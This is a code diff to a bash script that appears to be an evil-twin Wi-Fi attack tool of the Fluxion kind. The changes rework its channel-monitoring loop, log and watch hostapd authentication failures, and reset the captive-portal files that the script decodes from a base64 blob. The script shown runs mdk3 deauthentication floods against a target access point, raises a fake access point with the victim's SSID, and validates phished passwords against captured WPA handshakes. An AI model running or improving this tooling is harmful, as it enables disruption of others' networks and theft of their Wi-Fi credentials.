@@ -2063,21 +2063,31 @@ function routear {
 
 #> $DUMP_PATH/monitor_channel.sh
 function gen_monitor {
+> $DUMP_PATH/monitor_channel.sh
 cat << EOF  >> $DUMP_PATH/monitor_channel.sh
 Host_CHAN=$Host_CHAN
 NC=0
+sleep 300
 while true; do
+    grep 'did not acknowledge authentication response' $DUMP_PATH/hostapd.log &>/dev/null
+    if [ \$? -eq 0 ]; then
+        echo dead_wc > $DUMP_PATH/spipe && NC=0
+        sleep 300
+        > $DUMP_PATH/hostapd.log
+        continue
+    fi
+
     rm $DUMP_PATH/redump*  2> /dev/null
     timeout -s SIGKILL 10 airodump-ng $WIFI_MONITOR --bssid $Host_MAC -w $DUMP_PATH/redump 
     NCH=\`awk -F", "  '/^'$Host_MAC'/{print \$4}' $DUMP_PATH/redump-01.csv 2>/dev/null\`
     NCH=\${NCH##* }
     echo NCH:\$NCH, Host_CHAN:\$Host_CHAN
     if [ -z \$NCH ];then
-        let NC++;
+        let NC++
         [ \$NC -eq 6 ] && echo dead_wc > $DUMP_PATH/spipe && NC=0
-        sleep 30;
-        continue;
-    else NC=0;
+        sleep 60
+        continue
+    else NC=0
     fi
     if [ \$NCH -gt 0 ] && [ \$NCH -lt 15 ] && [ \$NCH -ne \$Host_CHAN ] 2>/dev/null
     then
@@ -2085,7 +2095,7 @@ while true; do
         killall mdk3 &> $flux_output_device
         xterm $HOLD $BOTTOMRIGHT -bg '#000000' -fg '#FF0009' -title 'Deauth all [mdk3]  '$Host_SSID -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c \$Host_CHAN &
     fi
-    sleep 60
+    sleep 120
 done
 EOF
 }
@@ -2109,7 +2119,7 @@ function MyAttack {
         if [ $fakeapmode = "hostapd" ]; then
                 killall hostapd &> $flux_output_device
                 sleep 0.5
-                xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FFFFFF" -title "AP" -e hostapd $DUMP_PATH/hostapd.conf &
+                hostapd -f $DUMP_PATH/hostapd.log $DUMP_PATH/hostapd.conf &
         elif [ $fakeapmode = "airbase-ng" ]; then
                 killall airbase-ng &> $flux_output_device
                 xterm $BOTTOMRIGHT -bg "#000000" -fg "#FFFFFF" -title "AP" -e airbase-ng -P -e $Host_SSID -c $Host_CHAN -a ${mac::13}$nomac${mac:14:4} $WIFI_MONITOR &
@@ -2159,6 +2169,7 @@ function monitor_wc {
 function attack {
         handshakecheck
         MyAttack
+        xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FFFFFF" -title "AP" -e tail -f $DUMP_PATH/hostapd.log &
         xterm -hold $TOPRIGHT -title "Wifi Information" -e $DUMP_PATH/handcheck &
         gen_monitor
         xterm  -title "Monitor Channel" -e bash -i $DUMP_PATH/monitor_channel.sh  &
@@ -2187,7 +2198,7 @@ $general_case_error"; conditional_clear ;;
 
 # Checks the validity of the password
 function handshakecheck {
-
+        > $DUMP_PATH/handcheck
         echo "#!/bin/bash
 
         echo > $DUMP_PATH/data.txt
@@ -2412,9 +2423,9 @@ function NEUTRA {
         if [ ! -d $DUMP_PATH/data ]; then
                 mkdir $DUMP_PATH/data
         fi
+        rm -rf $DUMP_PATH/data/* 2>/dev/null
 
         source $WORK_DIR/lib/site/index | base64 -d > $DUMP_PATH/file.zip
-
         unzip $DUMP_PATH/file.zip -d $DUMP_PATH/data &>$flux_output_device
         rm $DUMP_PATH/file.zip &>$flux_output_device
 
